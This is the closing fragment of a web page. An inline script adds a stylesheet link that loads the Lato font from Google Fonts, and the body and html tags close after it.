<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>